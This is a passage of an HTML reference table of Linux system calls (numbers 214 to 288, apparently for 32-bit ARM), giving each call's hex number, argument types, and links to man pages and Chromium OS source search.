<td align="center"><a href="https://man7.org/linux/man-pages/man2/setgid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setgid32">cs/</a></td>
<td align="center">0xd6</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">215</td>
<td>setfsuid32</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/setfsuid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setfsuid32">cs/</a></td>
<td align="center">0xd7</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">216</td>
<td>setfsgid32</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/setfsgid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setfsgid32">cs/</a></td>
<td align="center">0xd8</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">217</td>
<td>getdents64</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/getdents64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getdents64">cs/</a></td>
<td align="center">0xd9</td>
<td>unsigned int fd</td>
<td>struct linux_dirent64 *dirent</td>
<td>unsigned int count</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">218</td>
<td>pivot_root</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/pivot_root.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pivot_root">cs/</a></td>
<td align="center">0xda</td>
<td>const char *new_root</td>
<td>const char *put_old</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">219</td>
<td>mincore</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/mincore.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mincore">cs/</a></td>
<td align="center">0xdb</td>
<td>unsigned long start</td>
<td>size_t len</td>
<td>unsigned char * vec</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">220</td>
<td>madvise</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/madvise.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*madvise">cs/</a></td>
<td align="center">0xdc</td>
<td>unsigned long start</td>
<td>size_t len</td>
<td>int behavior</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">221</td>
<td>fcntl64</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/fcntl64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fcntl64">cs/</a></td>
<td align="center">0xdd</td>
<td>unsigned int fd</td>
<td>unsigned int cmd</td>
<td>unsigned long arg</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">222</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0xde</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">223</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0xdf</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">224</td>
<td>gettid</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/gettid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*gettid">cs/</a></td>
<td align="center">0xe0</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">225</td>
<td>readahead</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/readahead.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*readahead">cs/</a></td>
<td align="center">0xe1</td>
<td>int fd</td>
<td>loff_t offset</td>
<td>size_t count</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">226</td>
<td>setxattr</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/setxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setxattr">cs/</a></td>
<td align="center">0xe2</td>
<td>const char *path</td>
<td>const char *name</td>
<td>const void *value</td>
<td>size_t size</td>
<td>int flags</td>
<td>-</td>
</tr>
<tr>
<td align="center">227</td>
<td>lsetxattr</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/lsetxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lsetxattr">cs/</a></td>
<td align="center">0xe3</td>
<td>const char *path</td>
<td>const char *name</td>
<td>const void *value</td>
<td>size_t size</td>
<td>int flags</td>
<td>-</td>
</tr>
<tr>
<td align="center">228</td>
<td>fsetxattr</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/fsetxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fsetxattr">cs/</a></td>
<td align="center">0xe4</td>
<td>int fd</td>
<td>const char *name</td>
<td>const void *value</td>
<td>size_t size</td>
<td>int flags</td>
<td>-</td>
</tr>
<tr>
<td align="center">229</td>
<td>getxattr</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/getxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getxattr">cs/</a></td>
<td align="center">0xe5</td>
<td>const char *path</td>
<td>const char *name</td>
<td>void *value</td>
<td>size_t size</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">230</td>
<td>lgetxattr</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/lgetxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lgetxattr">cs/</a></td>
<td align="center">0xe6</td>
<td>const char *path</td>
<td>const char *name</td>
<td>void *value</td>
<td>size_t size</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">231</td>
<td>fgetxattr</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/fgetxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fgetxattr">cs/</a></td>
<td align="center">0xe7</td>
<td>int fd</td>
<td>const char *name</td>
<td>void *value</td>
<td>size_t size</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">232</td>
<td>listxattr</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/listxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*listxattr">cs/</a></td>
<td align="center">0xe8</td>
<td>const char *path</td>
<td>char *list</td>
<td>size_t size</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">233</td>
<td>llistxattr</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/llistxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*llistxattr">cs/</a></td>
<td align="center">0xe9</td>
<td>const char *path</td>
<td>char *list</td>
<td>size_t size</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">234</td>
<td>flistxattr</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/flistxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*flistxattr">cs/</a></td>
<td align="center">0xea</td>
<td>int fd</td>
<td>char *list</td>
<td>size_t size</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">235</td>
<td>removexattr</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/removexattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*removexattr">cs/</a></td>
<td align="center">0xeb</td>
<td>const char *path</td>
<td>const char *name</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">236</td>
<td>lremovexattr</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/lremovexattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lremovexattr">cs/</a></td>
<td align="center">0xec</td>
<td>const char *path</td>
<td>const char *name</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">237</td>
<td>fremovexattr</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/fremovexattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fremovexattr">cs/</a></td>
<td align="center">0xed</td>
<td>int fd</td>
<td>const char *name</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">238</td>
<td>tkill</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/tkill.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*tkill">cs/</a></td>
<td align="center">0xee</td>
<td>pid_t pid</td>
<td>int sig</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">239</td>
<td>sendfile64</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/sendfile64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sendfile64">cs/</a></td>
<td align="center">0xef</td>
<td>int out_fd</td>
<td>int in_fd</td>
<td>loff_t *offset</td>
<td>size_t count</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">240</td>
<td>futex</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/futex.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*futex">cs/</a></td>
<td align="center">0xf0</td>
<td>u32 *uaddr</td>
<td>int op</td>
<td>u32 val</td>
<td>const struct __kernel_timespec *utime</td>
<td>u32 *uaddr2</td>
<td>u32 val3</td>
</tr>
<tr>
<td align="center">241</td>
<td>sched_setaffinity</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_setaffinity.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_setaffinity">cs/</a></td>
<td align="center">0xf1</td>
<td>pid_t pid</td>
<td>unsigned int len</td>
<td>unsigned long *user_mask_ptr</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">242</td>
<td>sched_getaffinity</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_getaffinity.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_getaffinity">cs/</a></td>
<td align="center">0xf2</td>
<td>pid_t pid</td>
<td>unsigned int len</td>
<td>unsigned long *user_mask_ptr</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">243</td>
<td>io_setup</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/io_setup.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*io_setup">cs/</a></td>
<td align="center">0xf3</td>
<td>unsigned nr_reqs</td>
<td>aio_context_t *ctx</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">244</td>
<td>io_destroy</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/io_destroy.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*io_destroy">cs/</a></td>
<td align="center">0xf4</td>
<td>aio_context_t ctx</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">245</td>
<td>io_getevents</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/io_getevents.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*io_getevents">cs/</a></td>
<td align="center">0xf5</td>
<td>aio_context_t ctx_id</td>
<td>long min_nr</td>
<td>long nr</td>
<td>struct io_event *events</td>
<td>struct __kernel_timespec *timeout</td>
<td>-</td>
</tr>
<tr>
<td align="center">246</td>
<td>io_submit</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/io_submit.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*io_submit">cs/</a></td>
<td align="center">0xf6</td>
<td>aio_context_t</td>
<td>long</td>
<td>struct iocb * *</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">247</td>
<td>io_cancel</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/io_cancel.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*io_cancel">cs/</a></td>
<td align="center">0xf7</td>
<td>aio_context_t ctx_id</td>
<td>struct iocb *iocb</td>
<td>struct io_event *result</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">248</td>
<td>exit_group</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/exit_group.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*exit_group">cs/</a></td>
<td align="center">0xf8</td>
<td>int error_code</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">249</td>
<td>lookup_dcookie</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/lookup_dcookie.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lookup_dcookie">cs/</a></td>
<td align="center">0xf9</td>
<td>u64 cookie64</td>
<td>char *buf</td>
<td>size_t len</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">250</td>
<td>epoll_create</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/epoll_create.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*epoll_create">cs/</a></td>
<td align="center">0xfa</td>
<td>int size</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">251</td>
<td>epoll_ctl</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/epoll_ctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*epoll_ctl">cs/</a></td>
<td align="center">0xfb</td>
<td>int epfd</td>
<td>int op</td>
<td>int fd</td>
<td>struct epoll_event *event</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">252</td>
<td>epoll_wait</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/epoll_wait.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*epoll_wait">cs/</a></td>
<td align="center">0xfc</td>
<td>int epfd</td>
<td>struct epoll_event *events</td>
<td>int maxevents</td>
<td>int timeout</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">253</td>
<td>remap_file_pages</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/remap_file_pages.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*remap_file_pages">cs/</a></td>
<td align="center">0xfd</td>
<td>unsigned long start</td>
<td>unsigned long size</td>
<td>unsigned long prot</td>
<td>unsigned long pgoff</td>
<td>unsigned long flags</td>
<td>-</td>
</tr>
<tr>
<td align="center">254</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0xfe</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">255</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0xff</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">256</td>
<td>set_tid_address</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/set_tid_address.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*set_tid_address">cs/</a></td>
<td align="center">0x100</td>
<td>int *tidptr</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">257</td>
<td>timer_create</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/timer_create.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timer_create">cs/</a></td>
<td align="center">0x101</td>
<td>clockid_t which_clock</td>
<td>struct sigevent *timer_event_spec</td>
<td>timer_t * created_timer_id</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">258</td>
<td>timer_settime</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/timer_settime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timer_settime">cs/</a></td>
<td align="center">0x102</td>
<td>timer_t timer_id</td>
<td>int flags</td>
<td>const struct __kernel_itimerspec *new_setting</td>
<td>struct __kernel_itimerspec *old_setting</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">259</td>
<td>timer_gettime</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/timer_gettime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timer_gettime">cs/</a></td>
<td align="center">0x103</td>
<td>timer_t timer_id</td>
<td>struct __kernel_itimerspec *setting</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">260</td>
<td>timer_getoverrun</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/timer_getoverrun.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timer_getoverrun">cs/</a></td>
<td align="center">0x104</td>
<td>timer_t timer_id</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">261</td>
<td>timer_delete</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/timer_delete.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timer_delete">cs/</a></td>
<td align="center">0x105</td>
<td>timer_t timer_id</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">262</td>
<td>clock_settime</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/clock_settime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clock_settime">cs/</a></td>
<td align="center">0x106</td>
<td>clockid_t which_clock</td>
<td>const struct __kernel_timespec *tp</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">263</td>
<td>clock_gettime</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/clock_gettime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clock_gettime">cs/</a></td>
<td align="center">0x107</td>
<td>clockid_t which_clock</td>
<td>struct __kernel_timespec *tp</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">264</td>
<td>clock_getres</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/clock_getres.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clock_getres">cs/</a></td>
<td align="center">0x108</td>
<td>clockid_t which_clock</td>
<td>struct __kernel_timespec *tp</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">265</td>
<td>clock_nanosleep</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/clock_nanosleep.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clock_nanosleep">cs/</a></td>
<td align="center">0x109</td>
<td>clockid_t which_clock</td>
<td>int flags</td>
<td>const struct __kernel_timespec *rqtp</td>
<td>struct __kernel_timespec *rmtp</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">266</td>
<td>statfs64</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/statfs64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*statfs64">cs/</a></td>
<td align="center">0x10a</td>
<td>const char *path</td>
<td>size_t sz</td>
<td>struct statfs64 *buf</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">267</td>
<td>fstatfs64</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/fstatfs64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fstatfs64">cs/</a></td>
<td align="center">0x10b</td>
<td>unsigned int fd</td>
<td>size_t sz</td>
<td>struct statfs64 *buf</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">268</td>
<td>tgkill</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/tgkill.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*tgkill">cs/</a></td>
<td align="center">0x10c</td>
<td>pid_t tgid</td>
<td>pid_t pid</td>
<td>int sig</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">269</td>
<td>utimes</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/utimes.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*utimes">cs/</a></td>
<td align="center">0x10d</td>
<td>char *filename</td>
<td>struct __kernel_old_timeval *utimes</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">270</td>
<td>arm_fadvise64_64</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/arm_fadvise64_64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*arm_fadvise64_64">cs/</a></td>
<td align="center">0x10e</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">271</td>
<td>pciconfig_iobase</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/pciconfig_iobase.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pciconfig_iobase">cs/</a></td>
<td align="center">0x10f</td>
<td>long which</td>
<td>unsigned long bus</td>
<td>unsigned long devfn</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">272</td>
<td>pciconfig_read</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/pciconfig_read.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pciconfig_read">cs/</a></td>
<td align="center">0x110</td>
<td>unsigned long bus</td>
<td>unsigned long dfn</td>
<td>unsigned long off</td>
<td>unsigned long len</td>
<td>void *buf</td>
<td>-</td>
</tr>
<tr>
<td align="center">273</td>
<td>pciconfig_write</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/pciconfig_write.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pciconfig_write">cs/</a></td>
<td align="center">0x111</td>
<td>unsigned long bus</td>
<td>unsigned long dfn</td>
<td>unsigned long off</td>
<td>unsigned long len</td>
<td>void *buf</td>
<td>-</td>
</tr>
<tr>
<td align="center">274</td>
<td>mq_open</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_open.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_open">cs/</a></td>
<td align="center">0x112</td>
<td>const char *name</td>
<td>int oflag</td>
<td>umode_t mode</td>
<td>struct mq_attr *attr</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">275</td>
<td>mq_unlink</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_unlink.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_unlink">cs/</a></td>
<td align="center">0x113</td>
<td>const char *name</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">276</td>
<td>mq_timedsend</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_timedsend.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_timedsend">cs/</a></td>
<td align="center">0x114</td>
<td>mqd_t mqdes</td>
<td>const char *msg_ptr</td>
<td>size_t msg_len</td>
<td>unsigned int msg_prio</td>
<td>const struct __kernel_timespec *abs_timeout</td>
<td>-</td>
</tr>
<tr>
<td align="center">277</td>
<td>mq_timedreceive</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_timedreceive.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_timedreceive">cs/</a></td>
<td align="center">0x115</td>
<td>mqd_t mqdes</td>
<td>char *msg_ptr</td>
<td>size_t msg_len</td>
<td>unsigned int *msg_prio</td>
<td>const struct __kernel_timespec *abs_timeout</td>
<td>-</td>
</tr>
<tr>
<td align="center">278</td>
<td>mq_notify</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_notify.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_notify">cs/</a></td>
<td align="center">0x116</td>
<td>mqd_t mqdes</td>
<td>const struct sigevent *notification</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">279</td>
<td>mq_getsetattr</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_getsetattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_getsetattr">cs/</a></td>
<td align="center">0x117</td>
<td>mqd_t mqdes</td>
<td>const struct mq_attr *mqstat</td>
<td>struct mq_attr *omqstat</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">280</td>
<td>waitid</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/waitid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*waitid">cs/</a></td>
<td align="center">0x118</td>
<td>int which</td>
<td>pid_t pid</td>
<td>struct siginfo *infop</td>
<td>int options</td>
<td>struct rusage *ru</td>
<td>-</td>
</tr>
<tr>
<td align="center">281</td>
<td>socket</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/socket.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*socket">cs/</a></td>
<td align="center">0x119</td>
<td>int</td>
<td>int</td>
<td>int</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">282</td>
<td>bind</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/bind.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*bind">cs/</a></td>
<td align="center">0x11a</td>
<td>int</td>
<td>struct sockaddr *</td>
<td>int</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">283</td>
<td>connect</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/connect.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*connect">cs/</a></td>
<td align="center">0x11b</td>
<td>int</td>
<td>struct sockaddr *</td>
<td>int</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">284</td>
<td>listen</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/listen.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*listen">cs/</a></td>
<td align="center">0x11c</td>
<td>int</td>
<td>int</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">285</td>
<td>accept</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/accept.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*accept">cs/</a></td>
<td align="center">0x11d</td>
<td>int</td>
<td>struct sockaddr *</td>
<td>int *</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">286</td>
<td>getsockname</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/getsockname.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getsockname">cs/</a></td>
<td align="center">0x11e</td>
<td>int</td>
<td>struct sockaddr *</td>
<td>int *</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">287</td>
<td>getpeername</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/getpeername.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getpeername">cs/</a></td>
<td align="center">0x11f</td>
<td>int</td>
<td>struct sockaddr *</td>
<td>int *</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">288</td>
